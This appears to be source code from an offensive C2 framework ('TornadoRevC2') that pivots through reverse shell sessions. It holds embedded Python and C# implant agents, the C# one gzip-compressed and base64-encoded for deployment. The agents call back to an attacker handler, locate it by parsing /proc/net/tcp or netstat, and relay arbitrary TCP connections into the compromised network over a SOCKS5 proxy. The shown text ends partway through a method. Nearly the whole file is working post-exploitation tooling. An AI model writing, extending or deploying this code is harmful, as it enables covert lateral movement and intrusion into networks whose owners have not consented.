"""SOCKS5 internal pivoting through reverse shell sessions."""

import base64
import gzip
import json
import queue
import select
import socket
import struct
import time
import threading

from .constants import TUNNEL_MARK_END, TUNNEL_MARK_START, TUNNEL_REGISTER_MAGIC

TUNNEL_POOL_SIZE = 12 
RELAY_CHUNK = 65536
UPLOAD_QUEUE_SIZE = 32
DOWNLOAD_QUEUE_SIZE = 32
MAX_FRAME = 4 * 1024 * 1024
RELAY_ACTIVE_TIMEOUT = 120.0
RELAY_IDLE_TIMEOUT = 5.0
SOCK_BUF = 512 * 1024 
FRAME_JSON = 0
FRAME_SEND = 1
FRAME_RECV_REQ = 2
FRAME_RECV_RESP = 3
MAX_IDLE_ROUNDS = 30
MAX_CONCURRENT_RELAYS = 256
CHANNEL_QUEUE_SIZE = 128
RELAY_JOIN_TIMEOUT = 5.0
AGENT_VERSION = 2

_REMOTE_AGENT_SOURCE = r'''
import base64, json, socket, struct, sys, threading, time

CHANNELS = 12
MAX_BUF = 4194304
HIGH_WATER = 3145728
LOW_WATER = 1048576
MAX_FRAME = 4194304
RECV_SIZE = 65536
SOCK_BUF = 524288
IDLE_STREAM_TTL = 300.0
COMPACT_THRESHOLD = 65536

def recv_exact(conn, n):
    data = b''
    while len(data) < n:
        chunk = conn.recv(n - len(data))
        if not chunk:
            return None
        data += chunk
    return data

def recv_frame(conn):
    hdr = recv_exact(conn, 4)
    if not hdr:
        return None
    length = struct.unpack('>I', hdr)[0]
    if length == 0 or length > MAX_FRAME:
        return None
    body = recv_exact(conn, length)
    if not body:
        return None
    typ = body[0]
    if typ == 0:
        return json.loads(body[1:].decode('utf-8'))
    if typ == 1:
        sid = struct.unpack('>I', body[1:5])[0]
        return {'op': 'sendb', 'sid': sid, 'data': body[5:]}
    if typ == 2:
        sid, max_bytes = struct.unpack('>II', body[1:9])
        return {'op': 'recvb', 'sid': sid, 'max': max_bytes}
    return None

def send_json(conn, obj):
    payload = b'\x00' + json.dumps(obj, separators=(',', ':')).encode('utf-8')
    conn.sendall(struct.pack('>I', len(payload)) + payload)

def send_recvb(conn, sid, data, closed):
    body = struct.pack('>BIB', 3, sid, 1 if closed else 0) + data
    conn.sendall(struct.pack('>I', len(body)) + body)

def tune_sock(sock):
    try:
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCK_BUF)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCK_BUF)
    except Exception:
        pass

def detect_handler_ip(revshell_port, fallback='127.0.0.1'):
    try:
        with open('/proc/net/tcp') as fh:
            for line in fh.read().splitlines()[1:]:
                parts = line.split()
                if len(parts) < 4 or parts[3] != '01':
                    continue
                remote = parts[2]
                if int(remote.split(':')[1], 16) != int(revshell_port):
                    continue
                hexip = remote.split(':')[0]
                return '.'.join(str(int(hexip[i:i + 2], 16)) for i in (6, 4, 2, 0))
    except Exception:
        pass
    try:
        import subprocess
        out = subprocess.check_output(
            ['ss', '-H', '-tn', 'state', 'established', f'( dport = :{revshell_port} )'],
            stderr=subprocess.DEVNULL, text=True,
        )
        for line in out.splitlines():
            parts = line.split()
            if len(parts) >= 4:
                peer = parts[3]
                if peer.startswith('['):
                    return peer.split(']')[0][1:]
                return peer.rsplit(':', 1)[0]
    except Exception:
        pass
    if sys.platform == 'win32':
        try:
            import subprocess
            out = subprocess.check_output(['netstat', '-n'], stderr=subprocess.DEVNULL, text=True, errors='ignore')
            for line in out.splitlines():
                if 'ESTABLISHED' in line:
                    for part in line.split():
                        if part.count('.') == 3 and ':' in part and part.endswith(f':{revshell_port}'):
                            return part.rsplit(':', 1)[0]
        except Exception:
            pass
        return fallback

def reset_entry(entry):
    with entry['buf_lock']:
        entry['buf'].clear()
        entry['head'] = 0
    entry['drain'].set()

def gc_streams(streams, lock):
    now = time.time()
    with lock:
        dead = []
        for sid, e in list(streams.items()):
            if e.get('closed'):
                dead.append(sid)
                continue
            if now - e.get('last_activity', now) > IDLE_STREAM_TTL:
                dead.append(sid)
        for sid in dead:
            entry = streams.pop(sid, None)
            if entry:
                reset_entry(entry)
                try:
                    entry['sock'].close()
                except Exception:
                    pass

def pump(entry):
    sock = entry['sock']
    buf_lock = entry['buf_lock']
    drain = entry['drain']
    sock.settimeout(1.0)
    while not entry.get('closed'):
        with buf_lock:
            buf_len = len(entry['buf']) - entry['head']
        if buf_len >= HIGH_WATER:
            drain.clear()
        if buf_len >= MAX_BUF or not drain.is_set():
            drain.wait(timeout=0.2)
            continue
        try:
            piece = sock.recv(RECV_SIZE)
            if not piece:
                entry['closed'] = True
                reset_entry(entry)
                break
            with buf_lock:
                entry['buf'].extend(piece)
                entry['last_activity'] = time.time()
                buf_len = len(entry['buf']) - entry['head']
                if buf_len >= HIGH_WATER:
                    drain.clear()
                elif buf_len <= LOW_WATER:
                    drain.set()
        except socket.timeout:
            continue
        except Exception:
            entry['closed'] = True
            reset_entry(entry)
            break

def read_buf(entry, max_bytes):
    with entry['buf_lock']:
        buf = entry['buf']
        head = entry['head']
        avail = len(buf) - head
        if avail <= 0:
            if head:
                del buf[:head]
                entry['head'] = 0
            if entry['closed'] and buf:
                buf.clear()
            return b'', entry['closed']
        n = min(max_bytes, avail)
        chunk = bytes(buf[head:head + n])
        entry['head'] = head + n
        if entry['head'] >= COMPACT_THRESHOLD and entry['head'] * 2 >= len(buf):
            del buf[:entry['head']]
            entry['head'] = 0
        if len(buf) - entry['head'] <= LOW_WATER:
            entry['drain'].set()
        return chunk, entry['closed']

def close_stream(streams, lock, sid):
    with lock:
        entry = streams.pop(sid, None)
    if entry:
        entry['closed'] = True
        reset_entry(entry)
        try:
            entry['sock'].close()
        except Exception:
            pass

def purge_streams(streams, lock):
    with lock:
        items = list(streams.items())
        streams.clear()
    for _sid, entry in items:
        entry['closed'] = True
        reset_entry(entry)
        try:
            entry['sock'].close()
        except Exception:
            pass

def serve(conn, streams, lock):
    try:
        while True:
            msg = recv_frame(conn)
            if not msg:
                break
            op = msg.get('op')
            sid = msg.get('sid')
            if op == 'ping':
                send_json(conn, {'ok': True, 'op': 'pong'})
            elif op == 'connect':
                host = msg.get('host', '127.0.0.1')
                port = int(msg.get('port', 0))
                close_stream(streams, lock, sid)
                try:
                    remote = socket.create_connection((host, port), timeout=10)
                    tune_sock(remote)
                    entry = {
                        'sock': remote, 'buf': bytearray(), 'head': 0,
                        'buf_lock': threading.Lock(),
                        'drain': threading.Event(), 'closed': False,
                        'last_activity': time.time(),
                    }
                    entry['drain'].set()
                    with lock:
                        streams[sid] = entry
                    threading.Thread(target=pump, args=(entry,), daemon=True).start()
                    send_json(conn, {'ok': True, 'sid': sid})
                except Exception as exc:
                    send_json(conn, {'ok': False, 'sid': sid, 'error': str(exc)})
            elif op in ('send', 'sendb'):
                data = msg.get('data', b'') if op == 'sendb' else base64.b64decode(msg.get('data', '') or '')
                with lock:
                    entry = streams.get(sid)
                if not entry or entry['closed']:
                    send_json(conn, {'ok': False, 'sid': sid, 'error': 'closed', 'closed': True})
                    continue
                try:
                    entry['sock'].sendall(data)
                    entry['last_activity'] = time.time()
                    send_json(conn, {'ok': True, 'sid': sid})
                except Exception as exc:
                    entry['closed'] = True
                    reset_entry(entry)
                    send_json(conn, {'ok': False, 'sid': sid, 'error': str(exc), 'closed': True})
            elif op in ('recv', 'recvb'):
                max_bytes = int(msg.get('max', RECV_SIZE))
                with lock:
                    entry = streams.get(sid)
                if not entry:
                    send_json(conn, {'ok': False, 'sid': sid, 'error': 'missing', 'closed': True})
                    continue
                if entry['closed']:
                    reset_entry(entry)
                    if op == 'recvb':
                        send_recvb(conn, sid, b'', True)
                    else:
                        send_json(conn, {'ok': True, 'sid': sid, 'data': '', 'closed': True})
                    continue
                chunk, closed = read_buf(entry, max_bytes)
                if op == 'recvb':
                    send_recvb(conn, sid, chunk, closed)
                else:
                    send_json(conn, {
                        'ok': True, 'sid': sid,
                        'data': base64.b64encode(chunk).decode('ascii'),
                        'closed': closed,
                    })
            elif op == 'close':
                close_stream(streams, lock, sid)
                send_json(conn, {'ok': True, 'sid': sid})
            elif op == 'reset':
                with lock:
                    entry = streams.get(sid)
                if entry:
                    reset_entry(entry)
                    entry['closed'] = True
                    with lock:
                        streams.pop(sid, None)
                    try:
                        entry['sock'].close()
                    except Exception:
                        pass
                send_json(conn, {'ok': True, 'sid': sid})
            elif op == 'gc':
                gc_streams(streams, lock)
                send_json(conn, {'ok': True})
            elif op == 'purge':
                purge_streams(streams, lock)
                send_json(conn, {'ok': True})
            else:
                send_json(conn, {'ok': False, 'error': 'unknown op'})
    finally:
        gc_streams(streams, lock)

def worker(streams, lock, handler_host, handler_port, token):
    while True:
        conn = None
        try:
            conn = socket.create_connection((handler_host, handler_port), timeout=20)
            tune_sock(conn)
            send_json(conn, {'op': 'register', 'token': token, 'magic': 'TornadoRevC2', 'ver': 2})
            ack = recv_frame(conn)
            if not ack or not ack.get('ok'):
                conn.close()
                time.sleep(2)
                continue
            serve(conn, streams, lock)
        except Exception:
            pass
        finally:
            if conn:
                try:
                    conn.close()
                except Exception:
                    pass
        time.sleep(1)

def main():
    if len(sys.argv) < 4:
        return
    handler_host = sys.argv[1]
    handler_port = int(sys.argv[2])
    token = sys.argv[3]
    revshell_port = int(sys.argv[4]) if len(sys.argv) > 4 else max(handler_port - 1, 1)
    if handler_host == 'auto':
        handler_host = detect_handler_ip(revshell_port)
    streams = {}
    lock = threading.Lock()
    for _ in range(CHANNELS):
        threading.Thread(
            target=worker, args=(streams, lock, handler_host, handler_port, token), daemon=True,
        ).start()
    while True:
        time.sleep(3600)

if __name__ == '__main__':
    main()
'''

_REMOTE_AGENT_CS_SOURCE = r'''
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

public static class TornadoTunnel {
    const int CHANNELS   = 12;
    const int MAX_FRAME  = 4194304;
    const int RECV_SIZE  = 65536;
    const int HIGH_WATER = 3145728;
    const int LOW_WATER  = 1048576;
    const int SOCK_BUF   = 524288;
    const int COMPACT_THRESHOLD = 65536;
    const long IDLE_STREAM_TTL_MS = 300000L;

    static readonly object L = new object();
    static readonly Dictionary<uint, Entry> Streams = new Dictionary<uint, Entry>();

    sealed class Entry {
        public Socket Sock;
        public readonly MemoryStream Buf = new MemoryStream();
        public long Head = 0;
        public long LastActivityTicks = DateTime.UtcNow.Ticks;
        public readonly ManualResetEventSlim Drain = new ManualResetEventSlim(true);
        public volatile bool Closed;
        public readonly object Gate = new object();
    }

    static byte[] RecvExact(Socket s, int n) {
        var b = new byte[n];
        int off = 0;
        while (off < n) {
            int r;
            try { r = s.Receive(b, off, n - off, SocketFlags.None); }
            catch { return null; }
            if (r <= 0) return null;
            off += r;
        }
        return b;
    }

    static void SendAll(Socket s, byte[] d) {
        int off = 0;
        while (off < d.Length) {
            int w;
            try { w = s.Send(d, off, d.Length - off, SocketFlags.None); }
            catch { return; }
            if (w <= 0) return;
            off += w;
        }
    }

    static byte[] ReadFrame(Socket s, out byte typ) {
        typ = 0;
        var hdr = RecvExact(s, 4);
        if (hdr == null) return null;
        int len = (hdr[0] << 24) | (hdr[1] << 16) | (hdr[2] << 8) | hdr[3];
        if (len <= 0 || len > MAX_FRAME) return null;
        var body = RecvExact(s, len);
        if (body == null) return null;
        typ = body[0];
        var rest = new byte[len - 1];
        Buffer.BlockCopy(body, 1, rest, 0, len - 1);
        return rest;
    }

    static void SendFrame(Socket s, byte typ, byte[] body) {
        int total = body.Length + 1;
        var f = new byte[4 + total];
        f[0] = (byte)(total >> 24); f[1] = (byte)(total >> 16);
        f[2] = (byte)(total >> 8);  f[3] = (byte)total;
        f[4] = typ;
        Buffer.BlockCopy(body, 0, f, 5, body.Length);
        SendAll(s, f);
    }

    static void SendJson(Socket s, string j) {
        SendFrame(s, 0, Encoding.UTF8.GetBytes(j));
    }

    static uint BE32(byte[] b, int o) {
        return (uint)((b[o] << 24) | (b[o + 1] << 16) | (b[o + 2] << 8) | b[o + 3]);
    }

    static string JGet(string j, string k) {
        string pat = "\"" + k + "\":";
        int i = j.IndexOf(pat);
        if (i < 0) return null;
        i += pat.Length;
        while (i < j.Length && (j[i] == ' ' || j[i] == '\t')) i++;
        if (i >= j.Length) return null;
        if (j[i] == '"') {
            i++;
            var sb = new StringBuilder();
            while (i < j.Length && j[i] != '"') {
                if (j[i] == '\\' && i + 1 < j.Length) {
                    i++;
                    char c = j[i];
                    if (c == 'n') sb.Append('\n');
                    else if (c == 't') sb.Append('\t');
                    else if (c == 'r') sb.Append('\r');
                    else sb.Append(c);
                } else sb.Append(j[i]);
                i++;
            }
            return sb.ToString();
        }
        int st = i;
        while (i < j.Length && j[i] != ',' && j[i] != '}') i++;
        return j.Substring(st, i - st).Trim();
    }

    static void Tune(Socket s) {
        try {
            s.NoDelay = true;
            s.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
            s.ReceiveBufferSize = SOCK_BUF;
            s.SendBufferSize = SOCK_BUF;
        } catch {}
    }

    static void CloseEntry(Entry e) {
        if (e.Closed) return;
        e.Closed = true;
        lock (e.Gate) { e.Buf.SetLength(0); e.Head = 0; }
        e.Drain.Set();
        try { e.Sock.Close(); } catch {}
    }

    static void Pump(Entry e) {
        try { e.Sock.ReceiveTimeout = 1000; } catch {}
        var buf = new byte[RECV_SIZE];
        while (!e.Closed) {
            bool waitNeeded;
            lock (e.Gate) waitNeeded = (e.Buf.Length - e.Head) >= HIGH_WATER;
            if (waitNeeded) e.Drain.Reset();
            e.Drain.Wait(200);
            if (e.Closed) break;
            int r;
            try { r = e.Sock.Receive(buf); }
            catch (SocketException) { continue; }
            catch { CloseEntry(e); break; }
            if (r <= 0) { CloseEntry(e); break; }
            lock (e.Gate) {
                e.LastActivityTicks = DateTime.UtcNow.Ticks;
                e.Buf.Position = e.Buf.Length;
                e.Buf.Write(buf, 0, r);
                long avail = e.Buf.Length - e.Head;
                if (avail >= HIGH_WATER) e.Drain.Reset();
                else if (avail <= LOW_WATER) e.Drain.Set();
            }
        }
    }

    static byte[] ReadBuf(Entry e, int max, out bool closed) {
        lock (e.Gate) {
            long len = e.Buf.Length;
            long avail = len - e.Head;
            if (avail <= 0) {
                if (e.Head > 0) {
                    e.Buf.SetLength(0);
                    e.Buf.Position = 0;
                    e.Head = 0;
                }
                closed = e.Closed;
                return new byte[0];
            }
            int take = (int)Math.Min((long)max, avail);
            var outb = new byte[take];
            e.Buf.Position = e.Head;
            e.Buf.Read(outb, 0, take);
            e.Head += take;
            if (e.Head >= COMPACT_THRESHOLD && e.Head * 2 >= e.Buf.Length) {
                int rem = (int)(e.Buf.Length - e.Head);
                if (rem > 0) {
                    var rest = new byte[rem];
                    e.Buf.Position = e.Head;
                    e.Buf.Read(rest, 0, rem);
                    e.Buf.SetLength(0);
                    e.Buf.Position = 0;
                    e.Buf.Write(rest, 0, rem);
                } else {
                    e.Buf.SetLength(0);
                    e.Buf.Position = 0;
                }
                e.Head = 0;
            }
            if (e.Buf.Length - e.Head <= LOW_WATER) e.Drain.Set();
            closed = e.Closed;
            return outb;
        }
    }

    static void CloseStream(uint sid) {
        Entry e;
        lock (L) {
            if (!Streams.TryGetValue(sid, out e)) return;
            Streams.Remove(sid);
        }
        CloseEntry(e);
    }

    static void PurgeStreams() {
        List<Entry> all;
        lock (L) {
            all = new List<Entry>(Streams.Values);
            Streams.Clear();
        }
        foreach (var e in all) CloseEntry(e);
    }

    static void GC() {
        List<Entry> dead = new List<Entry>();
        long nowTicks = DateTime.UtcNow.Ticks;
        lock (L) {
            var keys = new List<uint>();
            foreach (var kv in Streams) {
                if (kv.Value.Closed) { keys.Add(kv.Key); continue; }
                long idleMs = (nowTicks - kv.Value.LastActivityTicks) / TimeSpan.TicksPerMillisecond;
                if (idleMs > IDLE_STREAM_TTL_MS) keys.Add(kv.Key);
            }
            foreach (var sid in keys) {
                Entry e;
                if (Streams.TryGetValue(sid, out e)) { dead.Add(e); Streams.Remove(sid); }
            }
        }
        foreach (var e in dead) CloseEntry(e);
    }

    static void Serve(Socket conn) {
        try {
            while (true) {
                byte typ;
                var body = ReadFrame(conn, out typ);
                if (body == null) break;

                if (typ == 0) {
                    string j = Encoding.UTF8.GetString(body);
                    string op = JGet(j, "op");
                    if (op == "ping") {
                        SendJson(conn, "{\"ok\":true,\"op\":\"pong\"}");
                    } else if (op == "connect") {
                        uint sid = uint.Parse(JGet(j, "sid"));
                        string host = JGet(j, "host");
                        int port = int.Parse(JGet(j, "port"));
                        CloseStream(sid);
                        try {
                            var s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                            s.Connect(host, port);
                            Tune(s);
                            var e = new Entry { Sock = s };
                            e.Drain.Set();
                            lock (L) Streams[sid] = e;
                            var t = new Thread(() => Pump(e)); t.IsBackground = true; t.Start();
                            SendJson(conn, "{\"ok\":true,\"sid\":" + sid + "}");
                        } catch (Exception ex) {
                            string msg = ex.Message.Replace("\"", "'").Replace("\\", "/");
                            SendJson(conn, "{\"ok\":false,\"sid\":" + sid + ",\"error\":\"" + msg + "\"}");
                        }
                    } else if (op == "close" || op == "reset") {
                        uint sid = uint.Parse(JGet(j, "sid"));
                        CloseStream(sid);
                        SendJson(conn, "{\"ok\":true,\"sid\":" + sid + "}");
                    } else if (op == "gc") {
                        GC();
                        SendJson(conn, "{\"ok\":true}");
                    } else if (op == "purge") {
                        PurgeStreams();
                        SendJson(conn, "{\"ok\":true}");
                    } else {
                        SendJson(conn, "{\"ok\":false,\"error\":\"unknown\"}");
                    }
                } else if (typ == 1) {
                    if (body.Length < 4) continue;
                    uint sid = BE32(body, 0);
                    int dlen = body.Length - 4;
                    Entry e; bool ok = false;
                    lock (L) Streams.TryGetValue(sid, out e);
                    if (e != null && !e.Closed) {
                        try {
                            var data = new byte[dlen];
                            Buffer.BlockCopy(body, 4, data, 0, dlen);
                            SendAll(e.Sock, data);
                            e.LastActivityTicks = DateTime.UtcNow.Ticks;
                            ok = true;
                        } catch { CloseEntry(e); }
                    }
                    SendJson(conn, "{\"ok\":" + (ok ? "true" : "false") + ",\"sid\":" + sid + (ok ? "" : ",\"closed\":true") + "}");
                } else if (typ == 2) {
                    if (body.Length < 8) continue;
                    uint sid = BE32(body, 0);
                    int max = (int)BE32(body, 4);
                    Entry e;
                    lock (L) Streams.TryGetValue(sid, out e);
                    if (e == null) {
                        var resp = new byte[5];
                        resp[0] = (byte)(sid >> 24); resp[1] = (byte)(sid >> 16);
                        resp[2] = (byte)(sid >> 8); resp[3] = (byte)sid;
                        resp[4] = 1;
                        SendFrame(conn, 3, resp);
                        continue;
                    }
                    bool closed;
                    var chunk = ReadBuf(e, max, out closed);
                    var rsp = new byte[5 + chunk.Length];
                    rsp[0] = (byte)(sid >> 24); rsp[1] = (byte)(sid >> 16);
                    rsp[2] = (byte)(sid >> 8); rsp[3] = (byte)sid;
                    rsp[4] = (byte)(closed ? 1 : 0);
                    Buffer.BlockCopy(chunk, 0, rsp, 5, chunk.Length);
                    SendFrame(conn, 3, rsp);
                }
            }
        } catch {}
        finally { GC(); }
    }

    static void Worker(string host, int port, string token) {
        while (true) {
            Socket conn = null;
            try {
                conn = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                conn.Connect(host, port);
                Tune(conn);
                SendJson(conn, "{\"op\":\"register\",\"token\":\"" + token + "\",\"magic\":\"TornadoRevC2\",\"ver\":2}");
                byte typ;
                var ack = ReadFrame(conn, out typ);
                if (ack == null || typ != 0) { conn.Close(); Thread.Sleep(2000); continue; }
                if (JGet(Encoding.UTF8.GetString(ack), "ok") != "true") { conn.Close(); Thread.Sleep(2000); continue; }
                Serve(conn);
            } catch {}
            try { if (conn != null) conn.Close(); } catch {}
            Thread.Sleep(1000);
        }
    }

    public static void Run(string host, int port, string token) {
        for (int i = 0; i < CHANNELS; i++) {
            var t = new Thread(() => Worker(host, port, token));
            t.IsBackground = true;
            t.Start();
        }
        Thread.Sleep(Timeout.Infinite);
    }
}
'''


_CS_GZ_B64 = base64.b64encode(
    gzip.compress(_REMOTE_AGENT_CS_SOURCE.encode('utf-8'), compresslevel=9)
).decode('ascii')

def _set_keepalive(sock):
    try:
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCK_BUF)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCK_BUF)
    except OSError:
        pass


def _recv_exact(conn, n, timeout=15.0):
    conn.settimeout(timeout)
    data = b''
    while len(data) < n:
        chunk = conn.recv(n - len(data))
        if not chunk:
            return None
        data += chunk
    return data


def _read_frame(conn, timeout=15.0):
    """Read one tunnel frame; return (message_dict_or_None, hard_fail)."""
    conn.settimeout(timeout)
    try:
        hdr = _recv_exact(conn, 4, timeout=timeout)
        if not hdr:
            return None, True
        length = struct.unpack('>I', hdr)[0]
        if length == 0 or length > MAX_FRAME:
            return None, True
        body = _recv_exact(conn, length, timeout=timeout)
        if not body:
            return None, True
        typ = body[0]
        if typ == FRAME_JSON:
            return json.loads(body[1:].decode('utf-8')), False
        if typ == ord('{'):
            return json.loads(body.decode('utf-8')), False
        if typ == FRAME_RECV_RESP:
            sid = struct.unpack('>I', body[1:5])[0]
            closed = bool(body[5])
            return {'op': '_recvb', 'sid': sid, 'data': body[6:], 'closed': closed}, False
        return None, True
    except socket.timeout:
        return None, False
    except (OSError, json.JSONDecodeError):
        return None, True
    finally:
        try:
            conn.settimeout(None)
        except OSError:
            pass


def _send_json(conn, obj):
    payload = b'\x00' + json.dumps(obj, separators=(',', ':')).encode('utf-8')
    conn.sendall(struct.pack('>I', len(payload)) + payload)


def _recv_framed(conn, timeout=15.0):
    msg, hard = _read_frame(conn, timeout=timeout)
    if msg is None:
        return None
    if msg.get('op') == '_recvb':
        return None
    return json.dumps(msg, separators=(',', ':')).encode('utf-8')


def _send_framed(conn, payload_bytes):
    if payload_bytes[:1] == b'{':
        payload = b'\x00' + payload_bytes
    else:
        payload = payload_bytes
    conn.sendall(struct.pack('>I', len(payload)) + payload)


class _RelayHandle:
    """Tracks one active SOCKS relay so reset can abort it cleanly."""

    __slots__ = ('sid', 'stop', 'threads', 'send_queue', 'recv_queue')

    def __init__(self, sid):
        self.sid = sid
        self.stop = threading.Event()
        self.threads = []
        self.send_queue = None
        self.recv_queue = None


class _ChannelWorker:
    """Serialize all I/O on one tunnel channel through a single worker thread."""

    __slots__ = ('manager', 'client_sock', 'conn', 'queue', 'stop', 'thread')

    def __init__(self, manager, client_sock, conn):
        self.manager = manager
        self.client_sock = client_sock
        self.conn = conn
        self.queue = queue.Queue(maxsize=CHANNEL_QUEUE_SIZE)
        self.stop = threading.Event()
        self.thread = threading.Thread(target=self._run, daemon=True, name='tunnel-ch')
        self.thread.start()

    def alive(self):
        return not self.stop.is_set() and self.manager._conn_alive(self.conn)

    def submit(self, fn, timeout=60.0):
        if not self.alive():
            return None, True
        result_box = []
        done = threading.Event()
        try:
            self.queue.put((fn, result_box, done), timeout=min(timeout, 5.0))
        except queue.Full:
            return None, False
        if not done.wait(timeout):
            return None, False
        return result_box[0] if result_box else (None, True)

    def _run(self):
        while not self.stop.is_set():
            try:
                item = self.queue.get(timeout=0.5)
            except queue.Empty:
                continue
            fn, result_box, done = item
            try:
                if self.manager._conn_alive(self.conn):
                    result_box.append(fn())
                else:
                    result_box.append((None, True))
            except Exception:
                result_box.append((None, True))
            finally:
                done.set()

    def drain(self):
        while True:
            try:
                _fn, result_box, done = self.queue.get_nowait()
                result_box.append((None, True))
                done.set()
            except queue.Empty:
                break

    def shutdown(self):
        self.stop.set()
        self.drain()
        self.thread.join(timeout=2.0)


class TunnelManager:
    """Manage SOCKS5 proxies for internal network pivoting through reverse shell sessions."""

    def __init__(self, handler):
        self.h = handler
        self._lock = threading.Lock()
        self._counter = 0
        self._proxies = {}
        self._session_agents = {}
        self._session_pools = {}
        self._channel_workers = {}
        self._channel_load = {}
        self._channel_rr = {}
        self._token_sessions = {}
        self._channel_ready = {}
        self._session_stream_counters = {}
        self._session_reset_gen = {}
        self._active_relays = {}
        self._relay_sems = {}
        self._deploy_locks = {}
        self._tunnel_listener = None
        self._tunnel_port = None
        self._last_error = ''
        self._ensure_tunnel_listener()

    def _ensure_tunnel_listener(self):
        with self._lock:
            if self._tunnel_listener:
                return self._tunnel_port
            base_port = int(self.h.revshell_port) + 1
            last_exc = None
            for port in range(base_port, base_port + 20):
                listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                try:
                    listener.bind(('0.0.0.0', port))
                    listener.listen(128)
                except OSError as exc:
                    last_exc = exc
                    listener.close()
                    continue
                self._tunnel_listener = listener
                self._tunnel_port = port
                threading.Thread(target=self._tunnel_accept_loop, daemon=True).start()
                return port
            raise OSError(last_exc or 'could not bind tunnel listener')

    def _tunnel_accept_loop(self):
        while True:
            try:
                conn, _ = self._tunnel_listener.accept()
                _set_keepalive(conn)
                threading.Thread(target=self._register_tunnel, args=(conn,), daemon=True).start()
            except OSError:
                break

    def _register_tunnel(self, conn):
        try:
            msg, _hard = _read_frame(conn, timeout=20.0)
            if not msg:
                conn.close()
                return
            if msg.get('op') != 'register' or msg.get('magic') != TUNNEL_REGISTER_MAGIC:
                conn.close()
                return
            token = msg.get('token')
            session_sock = self._token_sessions.get(token)
            if not session_sock:
                conn.close()
                return
            with self._lock:
                pool = self._session_pools.setdefault(session_sock, [])
                pool[:] = [c for c in pool if self._conn_alive(c)]
                if len(pool) >= TUNNEL_POOL_SIZE:
                    conn.close()
                    return
                pool.append(conn)
                self._channel_load.setdefault(id(conn), 0)
                self._channel_workers[id(conn)] = _ChannelWorker(self, session_sock, conn)
            _send_json(conn, {'ok': True})
            ready = self._channel_ready.get(token)
            if ready:
                ready.set()
            n = len(self._session_pools.get(session_sock, []))
            self._log(session_sock, f"Tunnel channel registered ({n}/{TUNNEL_POOL_SIZE})")
        except Exception:
            try:
                conn.close()
            except OSError:
                pass

    def _alive_conns(self, client_sock):
        pool = self._session_pools.get(client_sock, [])
        alive = []
        for c in pool:
            try:
                if c.fileno() != -1:
                    alive.append(c)
            except OSError:
                pass
        if len(alive) != len(pool):
            self._session_pools[client_sock] = alive
        return alive

    def _has_channels(self, client_sock):
        return bool(self._alive_conns(client_sock))

    def _conn_worker(self, conn):
        key = id(conn)
        with self._lock:
            worker = self._channel_workers.get(key)
            if worker is None and self._conn_alive(conn):
                worker = _ChannelWorker(self, None, conn)
                self._channel_workers[key] = worker
            return worker

    def _relay_sem(self, client_sock):
        with self._lock:
            sem = self._relay_sems.get(client_sock)
            if sem is None:
                sem = threading.Semaphore(MAX_CONCURRENT_RELAYS)
                self._relay_sems[client_sock] = sem
            return sem

    def _reset_gen(self, client_sock):
        with self._lock:
            return self._session_reset_gen.get(client_sock, 0)

    def _bump_reset_gen(self, client_sock):
        with self._lock:
            gen = self._session_reset_gen.get(client_sock, 0) + 1
            self._session_reset_gen[client_sock] = gen
            return gen

    def _register_relay(self, client_sock, sid):
        handle = _RelayHandle(sid)
        with self._lock:
            self._active_relays.setdefault(client_sock, {})[sid] = handle
        return handle

    def _unregister_relay(self, client_sock, sid):
        with self._lock:
            relays = self._active_relays.get(client_sock)
            if relays:
                relays.pop(sid, None)
                if not relays:
                    self._active_relays.pop(client_sock, None)

    def _abort_session_relays(self, client_sock, timeout=RELAY_JOIN_TIMEOUT):
        with self._lock:
            relays = list(self._active_relays.get(client_sock, {}).values())
        for handle in relays:
            handle.stop.set()
            if handle.send_queue is not None:
                try:
                    handle.send_queue.put_nowait(None)
                except queue.Full:
                    pass
            if handle.recv_queue is not None:
                try:
                    handle.recv_queue.put_nowait(None)
                except queue.Full:
                    pass
        self._drain_channel_workers(client_sock)
        deadline = time.time() + timeout
        for handle in relays:
            for thread in handle.threads:
                remaining = max(0.01, deadline - time.time())
                thread.join(timeout=remaining)
        with self._lock:
            self._active_relays.pop(client_sock, None)

    def _relay_stale(self, client_sock, gen):
        return gen != self._reset_gen(client_sock) or client_sock not in self.h.revshell_clients

    def _pick_channel(self, client_sock):
        alive = self._alive_conns(client_sock)
        if not alive:
            return None
        with self._lock:
            idx = self._channel_rr.get(client_sock, 0) % len(alive)
            self._channel_rr[client_sock] = idx + 1
        return alive[idx]

    def _inc_channel_load(self, conn, amount=1):
        if conn is None:
            return
        with self._lock:
            key = id(conn)
            self._channel_load[key] = max(0, self._channel_load.get(key, 0) + amount)

    def _channel_load_value(self, conn):
        with self._lock:
            return self._channel_load.get(id(conn), 0)

    def _remove_conn(self, client_sock, conn):
        key = id(conn)
        with self._lock:
            pool = self._session_pools.get(client_sock, [])
            if conn in pool:
                pool.remove(conn)
            worker = self._channel_workers.pop(key, None)
            self._channel_load.pop(key, None)
        if worker:
            worker.shutdown()
        try:
            conn.close()
        except OSError:
            pass

    def _drop_pool(self, client_sock):
        with self._lock:
            pool = list(self._session_pools.get(client_sock, []))
            workers = [self._channel_workers.pop(id(c), None) for c in pool]
            self._session_pools.pop(client_sock, None)
            self._channel_rr.pop(client_sock, None)
            for key in list(self._channel_load.keys()):
                if any(id(c) == key for c in pool):
                    self._channel_load.pop(key, None)
        for worker in workers:
            if worker:
                worker.shutdown()
        for conn in pool:
            try:
                conn.close()
            except OSError:
                pass

    def _pick_two_channels(self, client_sock):
        alive = self._alive_conns(client_sock)
        if not alive:
            return None, None
